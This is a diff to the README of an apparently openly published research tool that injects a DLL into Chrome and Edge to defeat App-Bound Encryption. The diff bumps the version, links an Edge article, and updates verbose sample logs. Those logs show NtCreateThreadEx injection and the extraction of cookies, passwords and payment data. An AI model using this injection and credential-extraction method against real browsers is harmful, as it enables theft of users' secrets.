@@ -29,14 +29,21 @@ These path-validation checks prevent any external tool — even with direct DPAP
 
 For a comprehensive understanding of Chrome's App-Bound Encryption, the intricacies of its implementation, the detailed mechanics of this tool's approach, and a broader discussion of related security vectors, please refer to my detailed research paper:
 
-➡️ **[Chrome App-Bound Encryption (ABE) - Technical Deep Dive & Research Notes](RESEARCH.md)**
+1.  ➡️ **[Chrome App-Bound Encryption (ABE) - Technical Deep Dive & Research Notes](RESEARCH.md)**
 
-This document covers:
-- The evolution from DPAPI to ABE.
-- A step-by-step breakdown of the ABE mechanism, including `IElevator` COM interactions and key wrapping.
-- Detailed methodology of the DLL injection strategy used by this tool.
-- Analysis of encrypted data structures and relevant Chromium source code insights.
-- Discussion of alternative decryption vectors and Chrome's evolving defenses.
+    This document covers:
+    * The evolution from DPAPI to ABE.
+    * A step-by-step breakdown of the ABE mechanism, including `IElevator` COM interactions and key wrapping.
+    * Detailed methodology of the DLL injection strategy used by this tool.
+    * Analysis of encrypted data structures and relevant Chromium source code insights.
+    * Discussion of alternative decryption vectors and Chrome's evolving defenses.
+
+2.  ➡️ **[The Curious Case of the Cantankerous COM: Decrypting Microsoft Edge's App-Bound Encryption](The_Curious_Case_of_the_Cantankerous_COM_Decrypting_Microsoft_Edge_ABE.md)**
+    This article details the specific challenges and reverse engineering journey undertaken to achieve reliable ABE decryption for Microsoft Edge. It includes:
+    *   An account of the initial issues and misleading error codes (`E_INVALIDARG`, `E_NOINTERFACE`).
+    *   The process of using COM type library introspection (with Python `comtypes`) to uncover Edge's unique `IElevatorEdge` vtable structure and inheritance.
+    *   How this insight led to tailored C++ interface stubs for successful interaction with Edge's ABE service.
+    *   A practical look at debugging tricky COM interoperability issues.
 
 ### ⚙️ Key Features
 
@@ -133,11 +140,11 @@ PS C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption> .\chrome
 |  Chrome App-Bound Encryption Decryption      |
 |  Multi-Method Process Injector               |
 |  Cookies / Passwords / Payment Methods       |
-|  v0.7.0 by @xaitax                           |
+|  v0.8.0 by @xaitax                           |
 ------------------------------------------------
 
 [*] Chrome not running, launching...
-[+] Chrome (v. 136.0.7103.93) launched w/ PID 12360
+[+] Chrome (v. 136.0.7103.93) launched w/ PID 17576
 [+] DLL injected via NtCreateThreadEx stealth
 [*] Waiting for DLL decryption tasks to complete (max 60s)...
 [+] DLL signaled completion.
@@ -153,7 +160,7 @@ PS C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption> .\chrome
 [+] IElevator -> DecryptData successful. Decrypted key length: 32
 [+] Decrypted AES key (hex) saved to: C:\Users\ah\AppData\Local\Temp\chrome_appbound_key.txt
 [+] Decrypted AES Key (hex): 97fd6072e90096a6f00dc4cb7d9d6d2a7368122614a99e1cc5aa980fbdba886b
-[*] 229 Cookies extracted to C:\Users\ah\AppData\Local\Temp\Chrome_decrypt_cookies.txt
+[*] 8 Cookies extracted to C:\Users\ah\AppData\Local\Temp\Chrome_decrypt_cookies.txt
 [*] 1 Passwords extracted to C:\Users\ah\AppData\Local\Temp\Chrome_decrypt_passwords.txt
 [*] 1 Payment methods extracted to C:\Users\ah\AppData\Local\Temp\Chrome_decrypt_payments.txt
 [*] Chrome data decryption process finished for Chrome.
@@ -169,45 +176,45 @@ PS C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption> .\chrome
 |  Chrome App-Bound Encryption Decryption      |
 |  Multi-Method Process Injector               |
 |  Cookies / Passwords / Payment Methods       |
-|  v0.7.0 by @xaitax                           |
+|  v0.8.0 by @xaitax                           |
 ------------------------------------------------
 
 [#] Verbose mode enabled.
 [#] CleanupPreviousRun: attempting to remove temp files
 [#] Deleting C:\Users\ah\AppData\Local\Temp\chrome_decrypt.log
 [#] Deleting C:\Users\ah\AppData\Local\Temp\chrome_appbound_key.txt
-[#] HandleGuard: acquired handle 184
+[#] HandleGuard: acquired handle 188
 [#] Created completion event: Global\ChromeDecryptWorkDoneEvent
 [#] Target: Chrome, Process: chrome.exe, Default Exe: C:\Program Files\Google\Chrome\Application\chrome.exe
 [#] GetProcessIdByName: snapshotting processes for chrome.exe
-[#] HandleGuard: acquired handle 188
+[#] HandleGuard: acquired handle 180
 [#] GetProcessIdByName: Process chrome.exe not found.
-[#] HandleGuard: closing handle 188
+[#] HandleGuard: closing handle 180
 [*] Chrome not running, launching...
 [#] StartBrowserAndWait: attempting to launch: C:\Program Files\Google\Chrome\Application\chrome.exe
-[#] HandleGuard: acquired handle 220
 [#] HandleGuard: acquired handle 224
-[#] Browser main thread handle: 224
-[#] Browser process handle: 220
+[#] HandleGuard: acquired handle 220
+[#] Browser main thread handle: 220
+[#] Browser process handle: 224
 [#] Waiting 3s for browser to initialize...
-[#] Browser started PID=15376
-[#] HandleGuard: closing handle 224
+[#] Browser started PID=6512
 [#] HandleGuard: closing handle 220
+[#] HandleGuard: closing handle 224
 [#] Retrieving version info for: C:\Program Files\Google\Chrome\Application\chrome.exe
 [#] Version query successful: 136.0.7103.93
-[+] Chrome (v. 136.0.7103.93) launched w/ PID 15376
-[#] Opening process PID=15376
+[+] Chrome (v. 136.0.7103.93) launched w/ PID 6512
+[#] Opening process PID=6512
 [#] HandleGuard: acquired handle 220
 [#] IsWow64Process2: processMachine=Unknown, nativeMachine=ARM64, effectiveArch=ARM64
 [#] Architecture match: Injector=ARM64, Target=ARM64
 [#] GetDllPath: DLL path determined as: C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\chrome_decrypt.dll
 [#] DLL path: C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\chrome_decrypt.dll
 [#] InjectWithNtCreateThreadEx: begin for DLL: C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\chrome_decrypt.dll
-[#] ntdll.dll base=140728837603328
-[#] NtCreateThreadEx addr=140728837610688
+[#] ntdll.dll base=140716223889408
+[#] NtCreateThreadEx addr=140716223896768
 [#] VirtualAllocEx size=87
-[#] WriteProcessMemory complete for DLL path to remote address: 2344395866112
-[#] Calling NtCreateThreadEx with LoadLibraryA at 140728775290080
+[#] WriteProcessMemory complete for DLL path to remote address: 2670231552000
+[#] Calling NtCreateThreadEx with LoadLibraryA at 140716207975648
 [#] HandleGuard: acquired handle 224
 [#] NtCreateThreadEx returned status 0, thread handle=224
 [#] Waiting for remote LoadLibraryA thread (NtCreateThreadEx) to complete (max 15s)...
@@ -230,18 +237,18 @@ PS C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption> .\chrome
 [+] IElevator -> DecryptData successful. Decrypted key length: 32
 [+] Decrypted AES key (hex) saved to: C:\Users\ah\AppData\Local\Temp\chrome_appbound_key.txt
 [+] Decrypted AES Key (hex): 97fd6072e90096a6f00dc4cb7d9d6d2a7368122614a99e1cc5aa980fbdba886b
-[*] 229 Cookies extracted to C:\Users\ah\AppData\Local\Temp\Chrome_decrypt_cookies.txt
+[*] 8 Cookies extracted to C:\Users\ah\AppData\Local\Temp\Chrome_decrypt_cookies.txt
 [*] 1 Passwords extracted to C:\Users\ah\AppData\Local\Temp\Chrome_decrypt_passwords.txt
 [*] 1 Payment methods extracted to C:\Users\ah\AppData\Local\Temp\Chrome_decrypt_payments.txt
 [*] Chrome data decryption process finished for Chrome.
 [*] Unloading DLL and exiting worker thread.
-[#] Terminating browser PID=15376 because injector started it.
-[#] HandleGuard: acquired handle 236
+[#] Terminating browser PID=6512 because injector started it.
+[#] HandleGuard: acquired handle 224
 [*] Chrome terminated by injector.
-[#] HandleGuard: closing handle 236
+[#] HandleGuard: closing handle 224
 [#] Injector finished.
 [#] HandleGuard: closing handle 220
-[#] HandleGuard: closing handle 184
+[#] HandleGuard: closing handle 188
 ```
 
 ## 📂 Data Extraction
@@ -348,6 +355,10 @@ Many of these relate to the conditions required for DPAPI to successfully operat
 *   Chrome has an internal recovery mechanism (`IElevator::RunRecoveryCRXElevated(...)`) that can re-wrap keys if DPAPI fails, but not implemented by this tool to avoid providing an easy bypass for malware.
 
 ## 🆕 Changelog
+
+### v0.8
+
+- **New**: **Reliable Microsoft Edge Decryption:** Implemented support for Edge's native App-Bound Encryption COM interface (`IElevatorEdge`), resolving previous inconsistencies and removing dependency on Brave Browser being installed. This involved detailed COM interface analysis and tailored C++ stubs for Edge's specific vtable layout.
 
 ### v0.7
 
